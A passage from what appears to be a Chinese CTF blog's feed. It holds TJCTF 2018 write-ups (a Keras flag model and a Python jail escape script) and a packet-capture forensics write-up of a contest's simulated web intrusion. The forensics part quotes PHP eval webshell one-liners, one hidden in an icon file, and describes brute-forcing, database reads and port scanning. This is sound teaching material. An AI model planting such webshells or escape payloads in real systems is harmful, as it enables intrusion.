class="comment"># 输出储存在Dataset中的层名称和权重</span></span><br><span class="line">        print(<span class="string">"      &#123;&#125;: &#123;&#125;"</span>.format(name, d.value))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_keras_wegiths</span><span class="params">(weight_file_path)</span>:</span></span><br><span class="line">    f = h5py.File(weight_file_path)  <span class="comment"># 读取weights h5文件返回File类</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> len(f.attrs.items()):</span><br><span class="line">            print(<span class="string">"&#123;&#125; contains: "</span>.format(weight_file_path))</span><br><span class="line">            print(<span class="string">"Root attributes:"</span>)</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> f.attrs.items():</span><br><span class="line">            print(<span class="string">"  &#123;&#125;: &#123;&#125;"</span>.format(key, value))  <span class="comment"># 输出储存在File类中的attrs信息，一般是各层的名称</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> layer, g <span class="keyword">in</span> f.items():  <span class="comment"># 读取各层的名称以及包含层信息的Group类</span></span><br><span class="line">            print(<span class="string">"  &#123;&#125;"</span>.format(layer))</span><br><span class="line">            print(<span class="string">"    Attributes:"</span>)</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> g.attrs.items(): <span class="comment"># 输出储存在Group类中的attrs信息，一般是各层的weights和bias及他们的名称</span></span><br><span class="line">                print(<span class="string">"      &#123;&#125;: &#123;&#125;"</span>.format(key, value))</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"    Dataset:"</span>)</span><br><span class="line">            <span class="keyword">for</span> name, d <span class="keyword">in</span> g.items(): <span class="comment"># 读取各层储存具体信息的Dataset类</span></span><br><span class="line">                print_dateset(name,d)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><p>尾部加个调用函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_keras_wegiths(&quot;learn_my_flag&quot;)</span><br></pre></td></tr></table></figure><p>运行下，截取了一些结果</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Users\YF\Desktop\tjctf 2018\learn_my_flag&gt;py -3 decrypt_learn_my_flag.py</span><br><span class="line">&gt; learn_my_flag contains:</span><br><span class="line">&gt; Root attributes:</span><br><span class="line">&gt;   keras_version: b&apos;2.2.0&apos;</span><br><span class="line">&gt;   backend: b&apos;tensorflow&apos;</span><br><span class="line">&gt;   model_config: b&apos;&#123;&quot;class_name&quot;: &quot;Sequential&quot;, &quot;config&quot;: [&#123;&quot;class_name&quot;: &quot;Dense&quot;, &quot;config&quot;: &#123;&quot;name&quot;: &quot;dense_1&quot;, &quot;trainable&quot;: true, &quot;batch_input_shape&quot;: [null, 1], &quot;dtype&quot;: &quot;float32&quot;, &quot;units&quot;: 16, &quot;activation&quot;: &quot;relu&quot;, &quot;use_bias&quot;: true, &quot;kernel_initializer&quot;: &#123;&quot;class_name&quot;: &quot;VarianceScaling&quot;, &quot;config&quot;: &#123;&quot;scale&quot;: 1.0, &quot;mode&quot;: &quot;fan_avg&quot;, &quot;distribution&quot;: &quot;uniform&quot;, &quot;seed&quot;: null&#125;&#125;, &quot;bias_initializer&quot;: &#123;&quot;class_name&quot;: &quot;Zeros&quot;, &quot;config&quot;: &#123;&#125;&#125;, &quot;kernel_regularizer&quot;: null, &quot;bias_regularizer&quot;: null, &quot;activity_regularizer&quot;: null, &quot;kernel_constraint&quot;: null, &quot;bias_constraint&quot;: null&#125;&#125;, &#123;&quot;class_name&quot;: &quot;Dense&quot;, &quot;config&quot;: &#123;&quot;name&quot;: &quot;dense_2&quot;, &quot;trainable&quot;: true, &quot;units&quot;: 12700, &quot;activation&quot;: &quot;linear&quot;, &quot;use_bias&quot;: true, &quot;kernel_initializer&quot;: &#123;&quot;class_name&quot;: &quot;VarianceScaling&quot;, &quot;config&quot;: &#123;&quot;scale&quot;: 1.0, &quot;mode&quot;: &quot;fan_avg&quot;, &quot;distribution&quot;: &quot;uniform&quot;, &quot;seed&quot;: null&#125;&#125;, &quot;bias_initializer&quot;: &#123;&quot;class_name&quot;: &quot;Zeros&quot;, &quot;config&quot;: &#123;&#125;&#125;, &quot;kernel_regularizer&quot;: null, &quot;bias_regularizer&quot;: null, &quot;activity_regularizer&quot;: null, &quot;kernel_constraint&quot;: null, &quot;bias_constraint&quot;: null&#125;&#125;, &#123;&quot;class_name&quot;: &quot;Activation&quot;, &quot;config&quot;: &#123;&quot;name&quot;: &quot;activation_1&quot;, &quot;trainable&quot;: true, &quot;activation&quot;: &quot;sigmoid&quot;&#125;&#125;, &#123;&quot;class_name&quot;: &quot;Reshape&quot;, &quot;config&quot;: &#123;&quot;name&quot;: &quot;reshape_1&quot;, &quot;trainable&quot;: true, &quot;target_shape&quot;: [50, 254]&#125;&#125;]&#125;&apos;</span><br><span class="line">&gt;   training_config: b&apos;&#123;&quot;optimizer_config&quot;: &#123;&quot;class_name&quot;: &quot;Adam&quot;, &quot;config&quot;: &#123;&quot;lr&quot;: 0.0010000000474974513, &quot;beta_1&quot;: 0.8999999761581421, &quot;beta_2&quot;: 0.9990000128746033, &quot;decay&quot;: 0.0, &quot;epsilon&quot;: 1e-07, &quot;amsgrad&quot;: false&#125;&#125;, &quot;loss&quot;: &quot;binary_crossentropy&quot;, &quot;metrics&quot;: [&quot;accuracy&quot;, &quot;mae&quot;], &quot;sample_weight_mode&quot;: null, &quot;loss_weights&quot;: null&#125;&apos;</span><br><span class="line">&gt;   model_weights</span><br><span class="line">&gt;     Attributes:</span><br><span class="line">&gt;       layer_names: [b&apos;dense_1&apos; b&apos;dense_2&apos; b&apos;activation_1&apos; b&apos;reshape_1&apos;]</span><br><span class="line">&gt;       backend: b&apos;tensorflow&apos;</span><br><span class="line">&gt;       keras_version: b&apos;2.2.0&apos;</span><br><span class="line">&gt;     Dataset:</span><br><span class="line">&gt;       activation_1</span><br><span class="line">&gt;       dense_1</span><br><span class="line">&gt;       dense_1</span><br><span class="line">&gt; .............</span><br><span class="line">&gt; .............</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>模型是基于tensorflow工具的keras框架生成的 ,em~,然后这里先铺个垫，上面有一句话给了特别的提示：</p><p> <code>{&quot;class_name&quot;: &quot;Reshape&quot;, &quot;config&quot;: {&quot;name&quot;: &quot;reshape_1&quot;, &quot;trainable&quot;: true, &quot;target_shape&quot;: [50, 254]}}]}&#39;</code>，给了<code>&quot;target_shape&quot;: [50, 254]</code>，这跟最终的解题脚本里的<code>output = output.reshape(50,254)</code>相照应。</p><p>嗯，咱们继续做题，然后呢。。。。我发现还是不会，那继续找资料啊。em~一波寻找，找到个相似的<a href="https://blog.csdn.net/dcrmg/article/details/79165995" target="_blank" rel="noopener">学习链接</a>。</p><p>学习，不断学习，终于靠着“愚公精神”写出来了代码（仔细看代码注释）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">os.environ[<span class="string">'TF_CPP_MIN_LOG_LEVEL'</span>] = <span class="string">'2'</span> </span><br><span class="line"></span><br><span class="line">model = load_model(<span class="string">'learn_my_flag'</span>)</span><br><span class="line"></span><br><span class="line">num=np.array([<span class="number">1</span>])</span><br><span class="line">output = model.predict(num)</span><br><span class="line">print(output.shape)</span><br><span class="line"></span><br><span class="line">output = output.reshape(<span class="number">50</span>,<span class="number">254</span>)</span><br><span class="line">plt.imshow(output,cmap = <span class="string">'gray'</span>)<span class="comment">#函数负责对图像进行处理，并显示其格式</span></span><br><span class="line">plt.show()<span class="comment">#将plt.imshow()处理后的函数显示出来</span></span><br></pre></td></tr></table></figure><p>运行，得到答案</p><p><img src="/2018/08/13/tjctf2018/1534355168624.png" alt="1534355168624"></p><p>坑点一：<code>Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA</code></p><p><img src="/2018/08/13/tjctf2018/1534353106260.png" alt="1534353106260"></p><p>解决办法：</p><p><img src="/2018/08/13/tjctf2018/1534353131189.png" alt="1534353131189"></p><p>引用链接来自：<a href="https://blog.csdn.net/hq86937375/article/details/79696023" target="_blank" rel="noopener">https://blog.csdn.net/hq86937375/article/details/79696023</a></p><p>坑点二：python的引用包的配置</p><p>这里给大家一点建议，凡是以后对科学数据的分析，比如机器学习啥啥啥的，最好使用<code>python3.6</code>的版本,只是建议啊，个人觉得这些应用包七七八八的错误更少。对此题而言，使用的是<code>python3.6+windows</code></p><p>最后的解题脚本运行前，进行了下列操作：</p><p><code>pip3.6 install matplotlib</code><br><code>pip3.6 install keras</code><br><code>pip3.6 install tensorflow</code></p><p>这题给的惊喜很大，虽然只有区区30分，但是非常锻炼学习能力，坑多啊。</p><h5 id="Miscellaneous-Mirror-Mirror"><a href="#Miscellaneous-Mirror-Mirror" class="headerlink" title="Miscellaneous_Mirror Mirror"></a>Miscellaneous_Mirror Mirror</h5><p><img src="/2018/08/13/tjctf2018/1534356504336.png" alt="1534356504336"></p><p>这题有点难度跟分数成反比。。。这题，额，百度下资料，下方提供了一些基本的学习资料，建议先看看，不然估计会蒙蔽:</p><p><a href="http://www.360zhijia.com/360anquanke/178589.html" target="_blank" rel="noopener">http://www.360zhijia.com/360anquanke/178589.html</a></p><p><a href="http://python.jobbole.com/89232/?utm_source=blog.jobbole.com&amp;utm_medium=relatedPosts" target="_blank" rel="noopener">http://python.jobbole.com/89232/?utm_source=blog.jobbole.com&amp;utm_medium=relatedPosts</a></p><p>下面演示下解题流程：</p><p>nc连接，了解题意，需要我们<code>get_flag()</code>最后的<code>flag</code></p><p><img src="/2018/08/13/tjctf2018/1534400079069.png" alt="1534400079069"></p><p>嗯，疯狂试探一波dir()，type()</p><p><img src="/2018/08/13/tjctf2018/1534400328991.png" alt="1534400328991"></p><p>卧槽，直接看到了<code>func_code</code>,来测试下<code>get_flag</code></p><p><img src="/2018/08/13/tjctf2018/1534401201039.png" alt="1534401201039"></p><p>看到这一行<code>if(eval(input) == super_secret_string):</code>，关键点<code>super_secret_string</code>，感觉有戏，继续深入</p><p><img src="/2018/08/13/tjctf2018/1534401772040.png" alt="1534401772040"></p><p>不出所料，<code>&quot;co_xxxxxx&quot;</code>出现了，尝试提取co_code,不过失败了（这里有个坑点，感兴趣的可以留言讨论）</p><p>不过，co_consts、co_varnames分别得到了这么两行数据</p><p><img src="/2018/08/13/tjctf2018/1534402938340.png" alt="1534402938340"></p><p><code>(None, &#39;this_is_the_super_secret_string&#39;, 48, 57, 65, 90, 97, 122, 44, 95, &#39; is not a valid character&#39;, &#39;%\xcb&#39;, &quot;You didn&#39;t guess the value of my super_secret_string&quot;)</code></p><p><code>(&#39;input&#39;, &#39;super_secret_string&#39;, &#39;each&#39;, &#39;val&#39;)</code></p><p>这个第二行的数据跟上面的关键点<code>super_secret_string</code>想照应。。但是到这里就卡壳了。</p><p>知道了这么多但是不知道如何利用。。。这有点尴尬，好在后面组队的小伙伴做出来了，给我发了个网址</p><p><a href="http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/" target="_blank" rel="noopener">http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/</a></p><p>学习下脚本，稍稍修改运行下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brainfuckize</span><span class="params">(nb)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> nb <span class="keyword">in</span> [<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">"~(&#123;&#125;&lt;[])"</span>, <span class="string">"~([]&lt;[])"</span>,</span><br><span class="line">                 <span class="string">"([]&lt;[])"</span>,  <span class="string">"(&#123;&#125;&lt;[])"</span>][nb+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nb % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"~%s"</span> % brainfuckize(~nb)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % brainfuckize(nb/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_chr</span><span class="params">(num)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"`'%\\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))]%("</span> + brainfuckize(num) + <span class="string">")"</span><span class="comment">#注意是\\</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">super_secret_string=<span class="string">"this_is_the_super_secret_string"</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> super_secret_string:</span><br><span class="line">result+= operate_chr(ord(i))</span><br><span class="line">result+=<span class="string">'+'</span></span><br><span class="line">result = result[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>测试下数据是否是<code>this_is_the_super_secret_string</code>，get_flag()读取即可</p><p><img src="/2018/08/13/tjctf2018/1534405699551.png" alt="1534405699551"></p><p><img src="/2018/08/13/tjctf2018/1534405633567.png" alt="1534405633567"></p><p>到这里就完毕啦，谢谢大家，学到的还是挺多的，继续努力咯，共勉！附件随后留言处上传！<code>^___^</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;tjctf2018这场比赛挺不错的，很多新颖的题目，题目难度分层的很好，有难有易，下面是这次的writeup.&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>博客正式上新 2018.08.12</title>
    <link href="https://jianghuxia.github.io/2018/08/12/hello-world/"/>
    <id>https://jianghuxia.github.io/2018/08/12/hello-world/</id>
    <published>2018-08-12T12:35:21.000Z</published>
    <updated>2018-08-14T07:50:40.985Z</updated>
    
    <content type="html"><![CDATA[<p>Yeah，博客终于正式上线了！最终,还是选择了github，之前使用Ghost、Typecho发现还是没github仓库+hexo来得适合一名极客。因为，简单、朴素却富有内涵。之前blog内容慢慢迁移，稍安勿躁。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, i am jianghuxia.</span><br></pre></td></tr></table></figure><a id="more"></a> <p>虽年少，亦希望不负青春年华：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">日日三省。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实践是检验真理的唯一标准。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有一种落差是，你配不上自己的野心，也辜负了所受的苦难。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">做一件事情最好的时间是10年前，其次就是现在。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">回报所有的施予，包括痛苦；感激全部的幸福，因为生活。</span><br></pre></td></tr></table></figure><p><img src="/2018/08/12/hello-world/jianghuxia.png" alt=""> </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Yeah，博客终于正式上线了！最终,还是选择了github，之前使用Ghost、Typecho发现还是没github仓库+hexo来得适合一名极客。因为，简单、朴素却富有内涵。之前blog内容慢慢迁移，稍安勿躁。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Hello, i am jianghuxia.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="life" scheme="https://jianghuxia.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>2018.05.11第七赛区铁人三项赛_赛后writeup</title>
    <link href="https://jianghuxia.github.io/2018/05/11/2018-05-11%E7%AC%AC%E4%B8%83%E8%B5%9B%E5%8C%BA%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B-%E8%B5%9B%E5%90%8Ewriteup/"/>
    <id>https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/</id>
    <published>2018-05-11T13:56:32.000Z</published>
    <updated>2018-08-21T14:01:39.299Z</updated>
    
    <content type="html"><![CDATA[<p>数据分析赛：<br>这次铁三分区赛，拿了一等奖（季军），哎，有付出总有收获，玩了两个月的协议，还行。<br>相对上个星期<code>05.05</code>的数据分析赛，觉得简单了很多，但其中值得学习的知识点也不少呀。<br><a id="more"></a></p><h4 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h4><p>比赛数据包给了<code>9</code>个，不多不少。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1710413102.png" alt="clipboard(1710413102.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1834883302.png" alt="clipboard(1834883302.png).png"><br>看到题目，头脑先要有个大概的黑客入侵公司的思维导图，总体脉络清晰后，我们再接着做题。<br>黑客攻击公司走的是以<code>tcp</code>为载体的<code>http</code>请求，所以过滤<code>http</code>成为解题的最基本的方法。发现漏洞，并利用了漏洞获取服务器的权限，则可以推测黑客上传了<code>webshell</code>，提权成功；可以对内网进行扫描和攻击，推出黑客提权后挂了代理，对内网及其主机进行扫描。</p><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><h5 id="关卡01-03"><a href="#关卡01-03" class="headerlink" title="关卡01~03"></a>关卡01~03</h5><p><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1586818363.png" alt="JVMYZQZ)`{7P@LU@HM9H@V8.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3895708137.png" alt="clipboard(3895708137.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1427483039.png" alt="clipboard(1427483039.png).png"><br>打开第一个数据包，可以发现有大量的<code>404 response code</code>，可知黑客进行了目录扫描，结合题目和数据包，黑客在扫后台登陆的网站地址。<br>数据包下滑发现，<code>404</code>消失，其次是大量的<code>post</code>请求。再结合数据包分析，过滤<code>POST</code>请求，可知黑客发现登陆后台网址<code>ad_admin.php</code>，接着对用户名和密码进行了爆破。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/719687826.png" alt="clipboard(719687826.png).png"><br>第一个数据包翻完，还是没看到爆破终止的痕迹。<br>通过分析，我们知道了在第一个数据包中，黑客的<code>攻击ip:202.1.1.2</code>，<code>服务器ip:192.168.1.203</code>，并且黑客虽然找到了后台登陆的网址（<code>http://192.168.1.203/ad_admin.php</code>），但并未成功爆破用户名和密码。关卡<code>02</code>和关卡<code>03</code>答案呼之欲出，关卡<code>01</code>答案需要剩余的流量包查找。<br>打开第二个数据包，接着过滤<code>POST</code>请求，观察下，发现末尾第<code>1042820</code>的分组后，黑客没有再继续爆破，但这里还不能确定是否爆破成功。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/148249159.png" alt="clipboard.png"><br>我们怎么验证呢？我们标记下这个包，过滤http流，而又因为我们知道了黑客的<code>IP</code>，我们可以过滤此<code>IP</code>方便我们分析，并排除其他干扰数据。.<br>过滤语句：<code>http &amp;&amp; ip.addr==202.1.1.2</code><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3521893764.png" alt="clipboard(3521893764.png).png"><br>跳转到我们刚刚标记的包，可以发现，这个服务器对这个<code>POST</code>请求的<code>302</code>响应包的<code>Length</code>是<code>442</code>，与之前的所有<code>POST</code>请求的<code>302</code>响应包的<code>Length</code>是<code>316</code>不同。再结合标记包的下个<code>GET</code>包，根据网址的目录名中<code>homgpage</code>，我们可以大胆推测黑客爆破成功了，用户名：<code>admin</code>，密码：<code>aabbcc</code>。关卡<code>01</code>的答案即可得到。<br>当然本着学习的角度，我们还是好好分析下这个问题：<br>我们查看标记包的<code>302</code>响应包内容和之前请求的<code>302</code>响应包有啥不同：<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2722905153.png" alt="clipboard.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2325941034.png" alt="clipboard (2325941034.png).png"><br>一个是<code>302</code>重定向的<code>Location</code>不同，还有一个就是标记包得到的响应包里<code>apadmin_password</code>是以<code>hash</code>值形式(为啥是<code>hash</code>的形式表示，见我的另一片文章一道赛题引起的思考——QUIC全解析)<br>根据上述，我们就可确定用户名和账号被黑客成功获得。<br>黑客获得账号和密码后，查看了后台管理的选项，进行了一些页面浏览。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/44806724.png" alt="clipboard.png"><br>到此，第二个数据包分析完毕。</p><h5 id="关卡04-07"><a href="#关卡04-07" class="headerlink" title="关卡04~07"></a>关卡04~07</h5><p><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1318217694.png" alt="clipboard.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4029907753.png" alt="clipboard (as).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/943651555.png" alt="clipboard"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2131200007.png" alt=""></p><p>第三个数据包，打开，依照题目，写入的<code>webshell</code>需要通过<code>POST</code>提交，过滤下。<br>过滤语句：<code>http.request.method==POST &amp;&amp; ip.addr==202.1.1.2</code><br>过滤后的第一个数据包就有彩蛋<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1379138565.png" alt="clipboard.png"><br>解码下：<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1738362390.png" alt="clipboard (1738362390.png).png"><br>可知黑客把<code>&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;</code>写入了<code>shell2.php</code>里，即<code>webshell</code>的内容，关卡<code>04</code>搞定（这里正确的答案需要把<code>\</code>去掉，还好我问了小丢姐姐是不是答案有误）。<br>而做题时，关卡<code>05</code>的问题让我的思路卡顿下，因为这个问题跳跃度有点大。<br>为啥能直接扯到<code>MYSQL</code>?没思路。咋办咯。只能看剩下来的<code>POST</code>请求中<code>shell2.php</code>中的黑客的操作。<br>果然。。发现了秘密。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3846784427.png" alt="clipboard (3846784427.png).png"><br>追踪下流，答案揭晓<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/384763775.png" alt="clipboard.png"><br>接着把上面的一句话木马的指令解码下<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3394366795.png" alt="clipboard (3394366795.png).png"><br>原来是查看了配置的<code>config.php</code>的文件，里面有数据库的配置，这才恍然大悟，原来关卡05的考点在这。<br>做到关卡<code>06</code>的时候，纳闷了下，第一个上传的木马文件不就是<code>shell2.php</code>嘛。后面小丢姐姐说了才知道是除了<code>shell2.php</code>的第一个木马文件。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1208537828.png" alt="clipboard (1208537828.png).png"><br>继续查看第三个数据包的内容，发现都是黑客查看数据库的内容的一些操作，只能继续下一个包了</p><p>打开第四个包，按之前的方式过滤，没有符合要求的包。。。。额。。。又晕了。别吓我，第四个没内容。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/435753455.png" alt="clipboard.png"><br>东看西看，还真没内容。（做完发现第四个包是个水包）<br>只能继续下一个包查看。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/472767690.png" alt="clipboard (472767690.png).png"><br>打开第五个包，过滤一通。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/70420077.png" alt="clipboard (70420077.png).png"><br>发现<code>shell2.php</code>后面的包出现了个<code>scan.php</code>，猜测<code>scan.php</code>就是继<code>shell2.php</code>后黑客上传的第一个木马文件。<br>仔细查看响应的包，嗯，果然可以证明这个推测。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1544902343.png" alt="clipboard.png"><br><code>cmd</code>内容解码下就知道，黑客上传了个新的木马文件<code>scan.php</code>，且对z1进行16进制解码即为<code>scan.php</code>的内容。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1413768279.png" alt="clipboard (1413768279.png).png"><br>至此，关卡06搞定。<br>在看看下面的包，又发现了关卡<code>07</code>的答案，即黑客进行内网扫描的端口范围。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/754210005.png" alt="clipboard (754210005.png).png"><br>而在做题时，我看错了，以为下面这个包是端口的范围。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4154369685.png" alt="clipboard (4154369685.png).png"><br>至此，第五个数据包分析完毕</p><h5 id="关卡09-10"><a href="#关卡09-10" class="headerlink" title="关卡09~10"></a>关卡09~10</h5><p><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/643606446.png" alt="clipboard.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2901186040.png" alt="clipboard (2901186040.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3026454065.png" alt="clipboard (3026454065.png).png"><br>打开第六个数据包，过滤下，包不多，分析一波。黑客又登陆了后台管理，进入了备份系统，对其中的<code>bak_2018-01-29-17-47-52.zip</code>文件，进行下载。<br>关卡<code>08</code>搞定。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/526570247.png" alt="clipboard (526570247.png).png"></p><p>接着打开第七个数据包，过滤下，查看第一个包<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3964359377.png" alt="clipboard.png"><br>解码下，看到<code>favicon.ico</code>（<code>ico</code>是图标文件的后缀名）<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1327320942.png" alt="clipboard (1327320942.png).png"><br>在把对应的<code>z1</code>的值拖到<code>winhex</code>里，在结尾部分可以发现一句话木马<code>&quot;&lt;?php @eval($_POST[&#39;picto&#39;]);?&gt;&quot;</code><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3113870093.png" alt="clipboard (3113870093.png).png"><br>picto即为隐藏在<code>favicon.ico</code>图片中的一句话木马。关卡<code>09</code>搞定。<br>继续分析流量包，发现<code>95286</code>分组的数据表示黑客查看了文件目录下的文件，而<code>106442</code>分组中的数据修改了<code>obj_edit.php</code>的内容。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4037703800.png" alt="clipboard.png"><br>而在整个过滤后的数据包末端，出现了一个新的<code>tunnel.php</code><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/700114939.png" alt="clipboard 